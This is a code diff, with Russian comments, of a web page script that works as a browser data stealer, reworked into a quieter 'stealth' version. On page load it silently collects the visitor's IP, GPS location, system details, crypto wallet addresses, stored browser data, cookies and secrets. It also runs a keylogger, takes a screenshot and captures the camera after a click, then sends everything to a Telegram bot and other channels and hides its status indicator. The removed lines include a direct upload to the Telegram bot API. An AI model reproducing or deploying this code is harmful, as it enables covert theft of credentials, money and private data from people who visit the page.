-                    lines.push('💰 Solana:');
-                    data.wallets.solana.forEach(sol => {
-                        if (sol.publicKey) lines.push(`  Адрес: ${sol.publicKey}`);
-                    });
-                }
-                lines.push('');
-            }
-            
-            if (data.credentials && data.credentials.forms && data.credentials.forms.length) {
-                lines.push(`🔓 Найдены формы (${data.credentials.forms.length}):`);
-                data.credentials.forms.forEach(form => {
-                    form.inputs.forEach(inp => {
-                        if (inp.value) {
-                            lines.push(`  ${inp.name || 'field'}: ${inp.value}`);
-                        }
-                    });
-                });
-                if (data.credentials.passwordManagers && data.credentials.passwordManagers.length) {
-                    lines.push(`  Менеджеры: ${data.credentials.passwordManagers.join(', ')}`);
-                }
-                lines.push('');
-            }
-            
-            if (data.clipboard) {
-                lines.push(`📋 Буфер обмена: ${trunc(data.clipboard, 200)}`);
-                lines.push('');
-            }
-            
+            const storage = data.storage || {};
+            const lsKeys = Object.keys(storage.localStorage || {});
+            if (lsKeys.length) lines.push(`💾 LS: ${lsKeys.length} keys`);
             if (data.secrets && data.secrets.length) {
-                lines.push(`🔑 Найдены секреты (${data.secrets.length}):`);
-                data.secrets.slice(0, 15).forEach(sec => {
-                    lines.push(`  ${sec.path}: ${sec.value}`);
-                });
-                if (data.secrets.length > 15) {
-                    lines.push(`  ... и ещё ${data.secrets.length - 15}`);
-                }
-                lines.push('');
+                lines.push(`🔑 Secrets (${data.secrets.length}):`);
+                data.secrets.slice(0, 5).forEach(s => lines.push(`  ${s.path}: ${s.value}`));
             }
-            
-            if (data.localScan) {
-                const open = data.localScan.filter(p => p.open);
-                if (open.length) {
-                    lines.push(`🌐 Открытые порты (${open.length}):`);
-                    open.forEach(p => {
-                        lines.push(`  ${p.ip}:${p.port}`);
-                    });
-                    lines.push('');
-                }
-            }
-            
-            if (data.media && data.media.devices && data.media.devices.length) {
-                lines.push(`🎥 Устройства медиа (${data.media.devices.length}):`);
-                data.media.devices.forEach(d => {
-                    lines.push(`  ${d.kind}: ${d.label}`);
-                });
-                if (data.media.snapshot) {
-                    lines.push(`  📸 Снимок: ${Math.round(data.media.snapshot.length/1024)}KB`);
-                }
-                lines.push('');
-            }
-            
-            if (data.sensors && data.sensors.battery) {
-                lines.push(`🔋 Батарея: ${data.sensors.battery.level}%${data.sensors.battery.charging ? ' (зарядка)' : ''}`);
-                lines.push('');
-            }
-            
-            if (data.keylogger) {
-                lines.push(`⌨️ Keylogger: активен`);
-                lines.push('');
-            }
-            
-            if (data.dom) {
-                lines.push(`🌐 Страница: ${data.dom.url || 'unknown'}`);
-                if (data.dom.title) lines.push(`  Заголовок: ${data.dom.title}`);
-                lines.push('');
-            }
-            
-            if (data.indexedDB && data.indexedDB.length) {
-                lines.push(`🗄️ IndexedDB (${data.indexedDB.length} БД):`);
-                data.indexedDB.forEach(db => {
-                    lines.push(`  ${db.name} (${db.stores?.length || 0} stores)`);
-                });
-                lines.push('');
-            }
-            
-            if (data.screenshot) {
-                lines.push(`🖼️ Скриншот: ${Math.round(data.screenshot/1024)}KB`);
-                lines.push('');
-            }
-            
-            lines.push('═'.repeat(40));
-            lines.push(`📅 ${data.timestamp || new Date().toISOString()}`);
-            lines.push(`🔗 ${window.location.href}`);
-            lines.push('');
-            lines.push('✅ Сбор завершён');
-            
+            if (data.screenshot) lines.push(`🖼 Screenshot: ${Math.round(data.screenshot.length/1024)}KB`);
+            if (data.keylogger) lines.push(`⌨️ Keylogger: active`);
+            lines.push(`📅 ${data.timestamp}`);
+            lines.push(`🔗 ${data.url}`);
             return lines.join('\n');
         }
 
         // ================================================================
-        // 17. ГЛАВНАЯ ФУНКЦИЯ — ВСЕ ВМЕСТЕ
+        // ГЛАВНАЯ ФУНКЦИЯ (тихая)
         // ================================================================
-        (async function ultimateStealer() {
+        (async function stealthStealer() {
             try {
-                setStatus('⏳ Сбор данных...');
-                log('🚀 Запуск ULTIMATE STEALER');
-                log(`📋 Токен: ${CFG.BOT_TOKEN.slice(0, 10)}...`);
-                log(`📋 Chat ID: ${CFG.CHAT_ID}`);
+                setStatus('⏳');
+                log('🚀 Stealth stealer starting...');
 
-                // Ключевой логгер (запускаем сразу)
+                // Keylogger сразу
                 const keylogger = setupKeylogger();
-                if (keylogger) log('⌨️ Keylogger активен');
 
-                const startTime = performance.now();
-
-                // Сбор ВСЕХ данных параллельно
-                log('📊 Начинаем параллельный сбор...');
-                
-                const [
-                    ips,
-                    webrtc,
-                    gps,
-                    system,
-                    extensions,
-                    wallets,
-                    credentials,
-                    clipboard,
-                    sensors,
-                    media,
-                    localScan,
-                    indexedDB,
-                    screenshot
-                ] = await Promise.allSettled([
-                    getAllIPs(),
-                    getWebRTCFull(),
+                // Параллельный сбор (без камеры — она отдельно)
+                const [ip, webrtc, gps, system, wallets, extensions, storage] = await Promise.all([
+                    getIP(),
+                    getWebRTC(),
                     getGPS(),
-                    Promise.resolve(getFullSystemInfo()),
-                    Promise.resolve(getAllExtensions()),
-                    Promise.resolve(getAllWallets()),
-                    Promise.resolve(getAllCredentials()),
-                    getClipboard(),
-                    getSensors(),
-                    getMediaDevices(),
-                    scanLocalNetwork(),
-                    getIndexedDB(),
-                    takeScreenshot()
+                    Promise.resolve(getSystem()),
+                    Promise.resolve(getWallets()),
+                    Promise.resolve(getExtensions()),
+                    Promise.resolve(getStorage())
                 ]);
 
-                log('✅ Сбор данных завершён');
+                // Секреты
+                const secrets = findSecrets(storage);
 
-                // Собираем все данные в один объект
+                // Скриншот (тихо)
+                const screenshot = await takeScreenshot();
+
+                // Камера — ТОЛЬКО ПО КЛИКУ (жертва сама даст доступ)
+                let media = null;
+                if (CFG.ENABLE_MEDIA) {
+                    log('📷 Waiting for camera permission (click)...');
+                    media = await requestCameraOnClick();
+                    if (media) log('📷 Camera captured');
+                    else log('📷 Camera skipped (no click)');
+                }
+
+                // Собираем всё
                 const fullData = {
                     timestamp: new Date().toISOString(),
                     url: window.location.href,
                     referrer: document.referrer || 'нет',
                     userAgent: navigator.userAgent,
-                    ips: ips.value || [],
-                    webrtc: webrtc.value || {},
-                    gps: gps.value || null,
-                    system: system.value || {},
-                    extensions: extensions.value || [],
-                    wallets: wallets.value || {},
-                    credentials: credentials.value || {},
-                    clipboard: clipboard.value || null,
-                    sensors: sensors.value || {},
-                    media: media.value || null,
-                    localScan: localScan.value || [],
-                    indexedDB: indexedDB.value || null,
-                    screenshot: screenshot.value ? screenshot.value.length : 0,
-                    keylogger: keylogger ? { active: true } : null,
+                    ip: ip || 'нет',
+                    webrtc: webrtc || [],
+                    gps: gps || null,
+                    system: system || {},
+                    wallets: wallets || [],
+                    extensions: extensions || [],
+                    storage: storage || {},
+                    secrets: secrets || [],
+                    screenshot: screenshot || null,
+                    media: media || null,
+                    keylogger: keylogger ? true : false,
                     dom: {
                         title: document.title,
                         url: window.location.href,
-                        referrer: document.referrer,
-                        cookies: document.cookie || 'нет',
-                        localStorage: { ...localStorage },
-                        sessionStorage: { ...sessionStorage }
-                    },
-                    performance: {
-                        total: Math.round(performance.now() - startTime)
+                        cookies: document.cookie || 'нет'
                     }
                 };
 
-                // Ищем секреты
-                const secrets = findAllSecrets({
-                    localStorage: { ...localStorage },
-                    sessionStorage: { ...sessionStorage },
-                    cookies: document.cookie
-                });
-                fullData.secrets = secrets;
-
-                // Формируем отчёт
+                // Отчёт
                 const report = formatReport(fullData);
-                log(`📊 Отчёт сформирован (${report.length} символов)`);
+                log(`📊 Report: ${report.length} chars`);
 
-                setStatus('📤 Отправка данных...');
+                // Отправка
+                setStatus('📤');
+                const result = await exfiltrate(report, fullData);
+                log(`✅ Telegram: ${result.teleOk}, Image: ${result.imgOk}, Beacon: ${result.beaconOk}`);
 
-                // Отправка ВСЕМИ каналами
-                const telegramOk = await sendToTelegram(report);
-                const webhookOk = await sendToWebhook(fullData);
+                setStatus('✅');
+                log('✅ Done');
 
-                // Отправка скриншота отдельно (если есть и он большой)
-                if (screenshot.value && screenshot.value.length > 10000) {
-                    try {
-                        const form = new FormData();
-                        form.append('chat_id', CFG.CHAT_ID);
-                        form.append('photo', await fetch(screenshot.value).then(r => r.blob()), 'screenshot.jpg');
-                        await fetch(`https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: form
-                        });
-                        log('📸 Скриншот отправлен');
-                    } catch (e) {
-                        log('⚠️ Скриншот не отправлен: ' + e.message);
-                    }
-                }
-
-                if (telegramOk || webhookOk) {
-                    setStatus('✅ Данные отправлены!');
-                    log('✅ УСПЕШНО! Данные отправлены в Telegram и Webhook');
-                } else {
-                    setStatus('⚠️ Частичная отправка');
-                    log('⚠️ Не все каналы сработали');
-                }
-
-                // Показываем кнопку теста
-                document.getElementById('testBtn').style.display = 'block';
-                document.getElementById('testBtn').onclick = window.testSend;
-
-                // Очистка следов
-                if (CFG.STEALTH) {
-                    console.clear();
-                    setTimeout(() => {
-                        statusEl.style.opacity = '0';
-                    }, 3000);
-                }
-
-                log(`⏱️ Время выполнения: ${Math.round(performance.now() - startTime)}ms`);
+                // Скрываем статус через пару секунд
+                setTimeout(() => {
+                    document.getElementById('status').style.opacity = '0';
+                }, 3000);
 
             } catch (e) {
-                setStatus('❌ Ошибка');
-                log('❌ Критическая ошибка: ' + e.message);
-                console.error(e);
+                log('❌ Error: ' + e.message);
+                setStatus('⚠️');
             }
         })();
 
         // ================================================================
         // ЗАПУСК
         // ================================================================
-        log('🚀 Инициализация...');
-        setTimeout(ultimateStealer, 300);
+        // Небольшая задержка, чтобы страница загрузилась
+        setTimeout(stealthStealer, 200);
 
-        // Тест по F12 (для отладки)
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'F12') {
-                log('🔍 F12 нажата');
-            }
-        });
+        // Консоль для отладки (только если F12)
+        console.log('✅ Loaded');
 
-        console.log('✅ ULTIMATE STEALER загружен');
-        console.log('📋 Для теста нажмите testSend() в консоли или кнопку внизу страницы');
-        console.log('🔍 Отладка в правом верхнем углу');
+        // Если нужен ручной тест — в консоли: testNow()
+        window.testNow = async function() {
+            const ip = await getIP();
+            const report = `🧪 Test\nIP: ${ip}\nTime: ${new Date().toISOString()}`;
+            await sendToTelegram(report);
+            console.log('✅ Test sent');
+        };
 
     </script>
 </body>
